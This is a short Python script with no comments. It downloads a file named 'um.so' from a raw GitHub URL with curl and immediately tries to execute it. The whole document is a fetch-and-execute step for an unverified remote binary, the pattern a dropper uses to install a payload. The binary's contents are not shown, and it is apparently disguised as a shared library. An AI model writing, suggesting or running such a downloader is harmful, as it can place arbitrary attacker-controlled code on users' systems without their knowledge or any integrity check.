import subprocess

um_so_url = "https://github.com/Saoud060/Approval/raw/main/um.so"

subprocess.run(["curl", "-o", "um.so", um_so_url])
try:
    subprocess.run(["./um.so"])
except Exception as e:
    print(f"Error: {e}")
